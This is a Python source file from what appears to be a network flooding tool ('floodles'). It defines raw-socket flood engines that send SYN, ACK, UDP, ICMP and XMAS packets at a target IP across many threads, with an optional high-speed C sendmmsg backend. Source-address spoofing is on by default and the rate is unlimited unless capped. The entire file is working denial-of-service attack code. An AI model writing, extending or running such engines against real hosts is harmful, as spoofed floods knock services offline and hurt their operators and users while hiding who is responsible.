"""
core/sender.py
Raw socket sender avec thread-pool, PPS rate control, metrics.

Backend auto-selection:
  1. C sender (libsender.so + sendmmsg) -> si disponible et root
  2. Python raw socket (sendto)         -> fallback toujours disponible

Le backend C est 3-10x plus rapide a haut PPS grace aux batch syscalls sendmmsg.
L'API FloodEngine est identique quel que soit le backend.
"""

import socket
import threading
import time
from dataclasses import dataclass, field
from collections import deque
from typing import Callable, Optional


# ---------------------------------------------------------------------------
# Metrics
# ---------------------------------------------------------------------------

@dataclass
class Metrics:
    packets_sent: int = 0
    bytes_sent:   int = 0
    errors:       int = 0
    start_time:   float = field(default_factory=time.time)

    _pps_window: deque = field(default_factory=lambda: deque(maxlen=200))
    _bps_window: deque = field(default_factory=lambda: deque(maxlen=200))
    _lock:       threading.Lock = field(default_factory=threading.Lock)

    # Set by NativeFloodEngine poller; when True, live_pps/live_bps use
    # the polled values instead of the per-packet window (which is never
    # populated by the C backend).
    _poll_active:   bool  = False
    _poll_live_pps: float = 0.0
    _poll_live_bps: float = 0.0

    def record(self, size: int) -> None:
        now = time.time()
        with self._lock:
            self.packets_sent += 1
            self.bytes_sent   += size
            self._pps_window.append(now)
            self._bps_window.append((now, size))

    def record_error(self) -> None:
        with self._lock:
            self.errors += 1

    @property
    def elapsed(self) -> float:
        return time.time() - self.start_time

    @property
    def avg_pps(self) -> float:
        e = self.elapsed
        return self.packets_sent / e if e > 0 else 0.0

    @property
    def avg_bps(self) -> float:
        e = self.elapsed
        return (self.bytes_sent * 8) / e if e > 0 else 0.0

    @property
    def live_pps(self) -> float:
        if self._poll_active:
            return self._poll_live_pps
        now    = time.time()
        cutoff = now - 2.0
        with self._lock:
            recent = [t for t in self._pps_window if t >= cutoff]
        return len(recent) / 2.0

    @property
    def live_bps(self) -> float:
        if self._poll_active:
            return self._poll_live_bps
        now    = time.time()
        cutoff = now - 2.0
        with self._lock:
            recent = [sz for ts, sz in self._bps_window if ts >= cutoff]
        return (sum(recent) * 8) / 2.0

    def summary(self) -> dict:
        return {
            "packets":   self.packets_sent,
            "bytes":     self.bytes_sent,
            "errors":    self.errors,
            "elapsed_s": round(self.elapsed, 2),
            "avg_pps":   round(self.avg_pps, 1),
            "avg_mbps":  round(self.avg_bps / 1_000_000, 3),
            "live_pps":  round(self.live_pps, 1),
            "live_mbps": round(self.live_bps / 1_000_000, 3),
            "backend":   getattr(self, "_backend", "python"),
        }


# ---------------------------------------------------------------------------
# Python raw socket sender (fallback)
# ---------------------------------------------------------------------------

class RawSender:
    """AF_INET/SOCK_RAW avec IP_HDRINCL. Requiert root."""

    def __init__(self) -> None:
        try:
            self._sock = socket.socket(
                socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW
            )
            self._sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            self._sock.setsockopt(
                socket.SOL_SOCKET, socket.SO_SNDBUF, 16 * 1024 * 1024
            )
        except PermissionError:
            raise PermissionError("[!] Raw socket requires root. Run with sudo.")

    def send(self, packet: bytes, dst_ip: str) -> int:
        try:
            return self._sock.sendto(packet, (dst_ip, 0))
        except OSError:
            return -1

    def close(self) -> None:
        self._sock.close()


# ---------------------------------------------------------------------------
# FloodEngine - Python thread pool
# ---------------------------------------------------------------------------

class FloodEngine:
    """
    Generic multi-threaded flood engine (Python backend).

    packet_fn : Callable[[], bytes | list[bytes]]
    dst_ip    : Destination IP
    threads   : Worker thread count
    pps_limit : Max packets/sec (0 = unlimited)
    duration  : Seconds to run (0 = until stop())
    """

    def __init__(
        self,
        packet_fn: Callable,
        dst_ip:    str,
        threads:   int = 8,
        pps_limit: int = 0,
        duration:  int = 0,
    ) -> None:
        self.packet_fn = packet_fn
        self.dst_ip    = dst_ip
        self.threads   = threads
        self.pps_limit = pps_limit
        self.duration  = duration

        self.metrics     = Metrics()
        self._stop_event = threading.Event()
        self._workers:   list[threading.Thread] = []

    def _worker(self, sender: RawSender) -> None:
        interval = (1.0 / self.pps_limit) if self.pps_limit > 0 else 0

        while not self._stop_event.is_set():
            t0 = time.perf_counter()

            result  = self.packet_fn()
            packets = result if isinstance(result, list) else [result]

            for pkt in packets:
                sent = sender.send(pkt, self.dst_ip)
                if sent > 0:
                    self.metrics.record(sent)
                else:
                    self.metrics.record_error()

            if interval > 0:
                elapsed = time.perf_counter() - t0
                sleep   = interval - elapsed
                if sleep > 0:
                    time.sleep(sleep)

    def start(self) -> None:
        self._stop_event.clear()
        self.metrics          = Metrics()
        self.metrics._backend = "python_sendto"

        for _ in range(self.threads):
            sender = RawSender()
            t = threading.Thread(
                target=self._worker, args=(sender,), daemon=True
            )
            t.start()
            self._workers.append(t)

        if self.duration > 0:
            timer = threading.Timer(self.duration, self.stop)
            timer.daemon = True
            timer.start()

    def stop(self) -> None:
        self._stop_event.set()

    def wait(self) -> None:
        for t in self._workers:
            t.join(timeout=2)

    def is_running(self) -> bool:
        return not self._stop_event.is_set()


# ---------------------------------------------------------------------------
# NativeFloodEngine - C sendmmsg backend
# ---------------------------------------------------------------------------

class NativeFloodEngine:
    """
    Wraps libsender.so flood_start/stop.
    3-10x plus rapide que FloodEngine Python a haut PPS.

    Utilise les types PKT_* pour specifier le type de paquet:
      PKT_SYN=0, PKT_ACK=1, PKT_UDP=2, PKT_ICMP=3, PKT_XMAS=4
    """

    PKT_SYN  = 0
    PKT_ACK  = 1
    PKT_UDP  = 2
    PKT_ICMP = 3
    PKT_XMAS = 4

    def __init__(
        self,
        dst_ip:    str,
        port:      int,
        pkt_type:  int,
        threads:   int = 8,
        pps_limit: int = 0,
        duration:  int = 0,
        spoof:     bool = True,
    ) -> None:
        from floodles.core.native_bridge import get_c_sender
        self._c = get_c_sender()
        if not self._c:
            raise RuntimeError("C sender not available")

        self.dst_ip    = dst_ip
        self.port      = port
        self.pkt_type  = pkt_type
        self.threads   = threads
        self.pps_limit = pps_limit
        self.duration  = duration
        self.spoof     = spoof
        self.metrics   = Metrics()
        self._thread: Optional[threading.Thread] = None

    def _poll_metrics(self) -> None:
        """Poll C atomic counters every 0.5s and update Python Metrics live."""
        prev_packets: int   = 0
        prev_bytes:   int   = 0
        prev_time:    float = time.time()

        while self._polling:
            time.sleep(0.5)
            if not self._polling:
                break

            now = time.time()
            try:
                s = self._c.stats()
            except Exception:
                continue

            cur_packets = s["packets"]
            cur_bytes   = s["bytes"]
            dt = now - prev_time

            with self.metrics._lock:
                self.metrics.packets_sent = cur_packets
                self.metrics.bytes_sent   = cur_bytes
                self.metrics.errors       = s["errors"]
                if dt > 0:
                    self.metrics._poll_live_pps = (cur_packets - prev_packets) / dt
                    # live_bps stored as bits/sec (matches the window-based property)
                    self.metrics._poll_live_bps = ((cur_bytes - prev_bytes) * 8) / dt

            prev_packets = cur_packets
            prev_bytes   = cur_bytes
            prev_time    = now

    def _run(self) -> None:
        self._polling = True
        self.metrics._poll_active = True
        self.metrics._backend     = "c_sendmmsg"

        poll_thread = threading.Thread(target=self._poll_metrics, daemon=True)
        poll_thread.start()

        self._c.start(
            self.dst_ip, self.port, self.threads,
            self.pps_limit, self.duration,
            self.pkt_type, self.spoof,
        )

        # C flood complete — stop poller and collect final stats
        self._polling = False
        poll_thread.join(timeout=2)

        s = self._c.stats()
        with self.metrics._lock:
            self.metrics.packets_sent   = s["packets"]
            self.metrics.bytes_sent     = s["bytes"]
            self.metrics.errors         = s["errors"]
            self.metrics._poll_active   = False
            self.metrics._poll_live_pps = 0.0
            self.metrics._poll_live_bps = 0.0

    def start(self) -> None:
        self._polling = False
        self._thread  = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._c.stop()

    def wait(self) -> None:
        if self._thread:
            self._thread.join(timeout=self.duration + 5)

    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()


# ---------------------------------------------------------------------------
# Factory - auto-selectionne le meilleur engine
# ---------------------------------------------------------------------------

def make_engine(
    packet_fn:    Optional[Callable],
    dst_ip:       str,
    port:         int  = 0,
    pkt_type:     int  = 0,
    threads:      int  = 8,
    pps_limit:    int  = 0,
    duration:     int  = 0,
    spoof:        bool = True,
    force_python: bool = False,
):
    """
    Retourne le meilleur engine disponible.

    Si packet_fn=None et C sender dispo -> NativeFloodEngine (sendmmsg)
    Sinon -> FloodEngine (Python, toujours dispo)
    """
    if not force_python and packet_fn is None:
        try:
            return NativeFloodEngine(
                dst_ip=dst_ip, port=port, pkt_type=pkt_type,
                threads=threads, pps_limit=pps_limit,
                duration=duration, spoof=spoof,
            )
        except RuntimeError:
            pass

    if packet_fn is None:
        raise ValueError("packet_fn requis quand C sender non disponible")

    return FloodEngine(
        packet_fn=packet_fn,
        dst_ip=dst_ip,
        threads=threads,
        pps_limit=pps_limit,
        duration=duration,
    )
